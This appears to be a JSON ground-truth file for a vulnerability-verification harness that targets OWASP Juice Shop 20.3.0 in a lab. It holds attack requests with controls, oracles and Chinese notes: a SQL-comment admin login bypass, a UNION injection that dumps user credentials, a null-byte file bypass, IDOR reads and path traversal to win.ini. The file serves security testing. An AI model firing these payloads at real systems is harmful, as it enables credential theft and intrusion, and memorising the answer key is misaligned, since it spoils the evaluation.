{
  "target": "OWASP Juice Shop 20.3.0 (official prebuilt, node22/win32)",
  "gt_source": "challenges 定义取自目标自身的 GET /api/Challenges（116 条），以及 apps/juice/gt/probe2_results.json 的实测记录",
  "identity": {
    "self": "canary.a.264285@lab.local",
    "other": "canary.b.264285@lab.local",
    "self_uid": 25,
    "other_uid": 26,
    "note": "由 identity.py 运行时注册，非预置常量"
  },
  "oracle": "第二条独立判据：GET /api/Challenges 的 solved 字段（应用自身记账）",
  "vulns": [
    {
      "id": "J-LOGIN-SQLI",
      "class": "auth_bypass_sqli",
      "criterion": "authentication_bypass",
      "oracle": "loginAdminChallenge",
      "request": {
        "method": "POST",
        "path": "/rest/user/login",
        "json": {
          "email": "admin@juice-sh.op' --",
          "password": "x"
        }
      },
      "control": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "admin@juice-sh.op",
            "password": "wrong-pass-xyz"
          }
        }
      ],
      "note": "注释符截断口令校验；对照=同账号错口令必须 401"
    },
    {
      "id": "J-UNION-CRED",
      "class": "union_credential_dump",
      "criterion": "database_access",
      "oracle": "unionSqlInjectionChallenge",
      "request": {
        "method": "GET",
        "path": "/rest/products/search",
        "params": {
          "q": "apple')) UNION SELECT id,email,password,4,5,6,7,8,9,10 FROM Users--"
        }
      },
      "control": [
        {
          "method": "GET",
          "path": "/rest/products/search",
          "params": {
            "q": "apple"
          }
        }
      ],
      "control_assert": {
        "type": "body_not_matches",
        "value": "[0-9a-f]{32}"
      },
      "note": "官方挑战叫 User Credentials：必须**导出凭据**才算，只证明注入存在不算。列数 10 是逐个数出来的"
    },
    {
      "id": "J-FTP-DOC",
      "class": "confidential_document",
      "criterion": "information_disclosure",
      "oracle": "directoryListingChallenge",
      "request": {
        "method": "GET",
        "path": "/ftp/acquisitions.md"
      },
      "control": [
        {
          "method": "GET",
          "path": "/ftp/package.json.bak"
        }
      ],
      "control_assert": {
        "type": "status",
        "value": 403
      },
      "note": "官方挑战实为 Confidential Document（访问机密文档），不是「目录列表」——一开始我映射错了，靠 oracle 不一致才发现"
    },
    {
      "id": "J-IDOR-BASKET",
      "class": "idor",
      "criterion": "unauthorized_data_access",
      "oracle": "basketAccessChallenge",
      "pre": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "canary.a.264285@lab.local",
            "password": "Canary#264285!"
          },
          "capture": {
            "name": "tok",
            "from": "authentication.token"
          }
        }
      ],
      "control_pre": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "canary.a.264285@lab.local",
            "password": "Canary#264285!"
          },
          "capture": {
            "name": "tok",
            "from": "authentication.token"
          }
        }
      ],
      "request": {
        "method": "GET",
        "path": "/rest/basket/7",
        "headers": {
          "Authorization": "Bearer ${tok}"
        }
      },
      "control": [
        {
          "method": "GET",
          "path": "/rest/basket/6",
          "headers": {
            "Authorization": "Bearer ${tok}"
          }
        }
      ],
      "note": "用 A 的会话读 B 的购物车（B 的 bid 由运行时注册得到，非预置）"
    },
    {
      "id": "J-NULLBYTE",
      "class": "sensitive_file_disclosure",
      "criterion": "file_access",
      "oracle": "nullByteChallenge",
      "oracle_extra": [
        "forgottenDevBackupChallenge"
      ],
      "request": {
        "method": "GET",
        "path": "/ftp/package.json.bak%2500.md"
      },
      "control": [
        {
          "method": "GET",
          "path": "/ftp/package.json.bak"
        }
      ],
      "note": "null byte 绕过后缀白名单；对照=不带 %%2500 时应被拒。实测同一请求会同时解掉 forgottenDevBackup（多标签），已记入 oracle_extra"
    },
    {
      "id": "J-FTP-DIRLIST",
      "class": "directory_listing",
      "criterion": "information_disclosure",
      "oracle": null,
      "request": {
        "method": "GET",
        "path": "/ftp/"
      },
      "control": [
        {
          "method": "GET",
          "path": "/"
        }
      ],
      "note": "目录索引页暴露。**20.3.0 的 116 条挑战里没有「Directory Listing」这一条**（directoryListingChallenge 实为 Confidential Document）→ 本用例无官方 oracle，只能靠闸门自证"
    },
    {
      "id": "J-METRICS",
      "class": "exposed_metrics",
      "criterion": "information_disclosure",
      "oracle": "exposedMetricsChallenge",
      "request": {
        "method": "GET",
        "path": "/metrics"
      },
      "control": [
        {
          "method": "GET",
          "path": "/"
        }
      ],
      "note": "/metrics 无需认证"
    },
    {
      "id": "J-BAC-USER1",
      "class": "data_exposure_object",
      "criterion": "unauthorized_data_access",
      "oracle": null,
      "pre": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "canary.a.264285@lab.local",
            "password": "Canary#264285!"
          },
          "capture": {
            "name": "tok",
            "from": "authentication.token"
          }
        }
      ],
      "control_pre": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "canary.a.264285@lab.local",
            "password": "Canary#264285!"
          },
          "capture": {
            "name": "tok",
            "from": "authentication.token"
          }
        }
      ],
      "request": {
        "method": "GET",
        "path": "/api/Users/1",
        "headers": {
          "Authorization": "Bearer ${tok}"
        }
      },
      "control": [
        {
          "method": "GET",
          "path": "/api/Users/25",
          "headers": {
            "Authorization": "Bearer ${tok}"
          }
        }
      ],
      "control_assert": {
        "type": "json_path_equals",
        "path": "data.email",
        "value": "canary.a.264285@lab.local"
      },
      "note": "普通用户读 admin 的记录；对照=读自己时 email 必须等于自己"
    },
    {
      "id": "J-USERLIST",
      "class": "data_exposure_list",
      "criterion": "unauthorized_data_access",
      "oracle": null,
      "pre": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "canary.a.264285@lab.local",
            "password": "Canary#264285!"
          },
          "capture": {
            "name": "tok",
            "from": "authentication.token"
          }
        }
      ],
      "request": {
        "method": "GET",
        "path": "/api/Users",
        "headers": {
          "Authorization": "Bearer ${tok}"
        }
      },
      "control": [
        {
          "method": "GET",
          "path": "/api/Users"
        }
      ],
      "control_assert": {
        "type": "status",
        "value": 401
      },
      "note": "普通用户拿到全量用户列表；对照=不带 token 必须 401"
    },
    {
      "id": "N-LOGIN-NOUSER",
      "class": "auth_bypass_sqli",
      "criterion": "authentication_bypass",
      "oracle": null,
      "expect": "rejected",
      "request": {
        "method": "POST",
        "path": "/rest/user/login",
        "json": {
          "email": "nobody-25@nowhere.local' --",
          "password": "x"
        }
      },
      "control": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "admin@juice-sh.op",
            "password": "wrong-pass-xyz"
          }
        }
      ],
      "note": "同样的注释符手法，但账号不存在 → 必须拒绝"
    },
    {
      "id": "N-UNION-9COLS",
      "class": "sql_injection",
      "criterion": "database_access",
      "oracle": null,
      "expect": "rejected",
      "request": {
        "method": "GET",
        "path": "/rest/products/search",
        "params": {
          "q": "apple')) UNION SELECT 1,2,3,4,5,'UNIONMARKJ001',7,8,9--"
        }
      },
      "control": [
        {
          "method": "GET",
          "path": "/rest/products/search",
          "params": {
            "q": "apple"
          }
        }
      ],
      "note": "列数错 → 只有 SQL 报错，marker 绝不该出现"
    },
    {
      "id": "N-BASKET-404",
      "class": "idor",
      "criterion": "unauthorized_data_access",
      "oracle": null,
      "expect": "rejected",
      "pre": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "canary.a.264285@lab.local",
            "password": "Canary#264285!"
          },
          "capture": {
            "name": "tok",
            "from": "authentication.token"
          }
        }
      ],
      "control_pre": [
        {
          "method": "POST",
          "path": "/rest/user/login",
          "json": {
            "email": "canary.a.264285@lab.local",
            "password": "Canary#264285!"
          },
          "capture": {
            "name": "tok",
            "from": "authentication.token"
          }
        }
      ],
      "request": {
        "method": "GET",
        "path": "/rest/basket/999999",
        "headers": {
          "Authorization": "Bearer ${tok}"
        }
      },
      "control": [
        {
          "method": "GET",
          "path": "/rest/basket/6",
          "headers": {
            "Authorization": "Bearer ${tok}"
          }
        }
      ],
      "note": "不存在的购物车 → 必须拒绝"
    },
    {
      "id": "N-TRAVERSAL",
      "class": "sensitive_file_disclosure",
      "criterion": "file_access",
      "oracle": null,
      "expect": "rejected",
      "request": {
        "method": "GET",
        "path": "/ftp/../../../windows/win.ini"
      },
      "control": [
        {
          "method": "GET",
          "path": "/ftp/package.json.bak"
        }
      ],
      "note": "路径穿越取系统文件 → 不该成功"
    },
    {
      "id": "N-USERS-NOAUTH",
      "class": "data_exposure_list",
      "criterion": "unauthorized_data_access",
      "oracle": null,
      "expect": "blocked",
      "request": {
        "method": "GET",
        "path": "/api/Users"
      },
      "control": [
        {
          "method": "GET",
          "path": "/api/Users"
        }
      ],
      "note": "无凭证 → 期望被判 blocked（需要认证），而不是 rejected"
    },
    {
      "id": "N-METRICS-INDEX",
      "class": "exposed_metrics",
      "criterion": "information_disclosure",
      "oracle": null,
      "expect": "rejected",
      "request": {
        "method": "GET",
        "path": "/"
      },
      "control": [
        {
          "method": "GET",
          "path": "/"
        }
      ],
      "note": "首页不含指标格式 → 必须拒绝"
    }
  ]
}